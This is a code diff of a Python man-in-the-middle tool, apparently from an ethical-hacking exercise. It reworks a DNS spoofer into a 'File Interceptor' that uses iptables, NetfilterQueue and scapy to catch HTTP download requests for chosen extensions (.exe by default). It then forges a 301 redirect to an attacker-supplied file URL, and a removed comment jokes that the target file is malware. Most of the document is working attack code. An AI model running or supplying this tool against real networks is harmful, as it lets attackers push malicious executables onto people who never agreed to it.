@@ -1,15 +1,28 @@
 #!/usr/bin/env python3
-import netfilterqueue
-import scapy.all as scapy
-import sys, os, subprocess
-import time
+import sys, os, subprocess, time, argparse
 
+try:
+    import scapy.all as scapy
+    from netfilterqueue import NetfilterQueue
+except ImportError as e:
+    print("\n[-] Dependency Error: Virtual Environment missing or incomplete.")
+    print(f"    Specific missing module: {e}")
+    print("\n[*] Please follow these steps to fix the environment:")
+    print("\n    1. Create the virtual environment in the parent directory:")
+    print("       python3 -m venv myvenv")
+    print("\n    2. Activate it and install the required tools:")
+    print("       source myvenv/bin/activate")
+    print("       pip install scapy NetfilterQueue")
+    print("\n    3. Run the script using the specific venv python path:")
+    print("       sudo ../myvenv/bin/python3 file_interceptor.py\n")
+    
+    sys.exit()
 
 def root_check():
     if os.geteuid() != 0:
         sys.exit("[!] This script must run as root")
     else:
-        print("[*] Welcome to the DNS Spoofer.")
+        print("[*] Welcome to the File Interceptor.")
 
 
 def iptable_insert():
@@ -31,35 +44,50 @@ def iptable_flush():
     except Exception as e:
         print(f"[!] Error flushing iptables: {e}")
 
+def parse_args():
+    parser = argparse.ArgumentParser(description="File Interceptor Tool")
+    parser.add_argument('-e', '--extension', required=False, default=".exe", help="File extensions to replace separated by commas (ex. .png,.jpg)")
+    parser.add_argument('-u', '--url', required=True, help="URL to the file to replace with (ex. https://192.168.1.50)")
+    return parser.parse_args()
 
-def process_packet(packet):
+
+def process_packet(packet, extensions_to_replace, file_destination):
     global packet_count
+    global ack_dict
     packet_count += 1
-    TTL = 10
 
     scapy_packet = scapy.IP(packet.get_payload())
     
     if scapy_packet.haslayer(scapy.Raw):
-        # Check for HTTP Request
-        if scapy_packet[scapy.TCP].dport == 80:
-            if b".exe" in scapy_packet[scapy.Raw].load:
-                print("[+] .exe file download detected")
+        # OUTGOING REQUEST Check for file download
+        if scapy_packet[scapy.TCP].dport == 80: #Traffic supposed to flow through bettercap so 8080 proxy
+            if any(ext.encode() in scapy_packet[scapy.Raw].load for ext in extensions_to_replace):
+        
+                # Check if the user is already requesting our spoof file. Convert file_destination to bytes for comparison
+                if file_destination.encode() not in scapy_packet[scapy.Raw].load:
+                    print(f"[+] File type {ext} download detected. Queuing redirect...")
+                    ack_dict[scapy_packet[scapy.TCP].ack] = time.time()
+                else:
+                    print("[-] Ignoring request for our own file to prevent loop.")
 
-                # Store the expected ACK with the current timestamp
-                ack_dict[scapy_packet[scapy.TCP].ack] = time.time()
-
-        # Check for HTTP Response
+        # INCOMING RESPONSE (Replace the file)
         elif scapy_packet[scapy.TCP].sport == 80:
             current_seq = scapy_packet[scapy.TCP].seq
 
             if current_seq in ack_dict:
                 del ack_dict[current_seq]
-                print("[+] Replacing file")
+                print(f"[+] Replacing file with: {file_destination}")
 
                 #Forge the Response
-                #Change this location to malware. I mean your selected file..
-                modified_load = b"HTTP/1.1 301 Moved Permanently\nLocation: https://192.168.1.50/Path/to/file.exe\r\n\r\n"
-                scapy_packet[scapy.Raw].load = modified_load
+                #We create a string first, then encode to bytes.
+                redirect_header = (
+                    "HTTP/1.1 301 Moved Permanently\r\n"
+                    f"Location: {file_destination}\r\n"
+                    "Content-Length: 0\r\n"
+                    "Connection: close\r\n\r\n"
+                )
+                scapy_packet[scapy.Raw].load = redirect_header.encode()
+
                 # Remove checksums so Scapy recalculates them
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
@@ -81,16 +109,20 @@ def process_packet(packet):
 
 if __name__ == "__main__":
     root_check()
+    args = parse_args()
+    extensions_to_trigger = args.extension.split(',')
+    url_to_pull_from = args.url
+    
     iptable_insert()
 
     # create the object, bind to the iptables command and run
-    queue = netfilterqueue.NetfilterQueue()
+    queue = NetfilterQueue()
     
     ack_dict = {}
     packet_count = 0
 
     try:
-        queue.bind(1337, process_packet)
+        queue.bind(1337, lambda packet: process_packet(packet, extensions_to_trigger, url_to_pull_from))
         try:
             print("[*] Starting packet interception. Press Ctrl+C to stop.")
             queue.run()
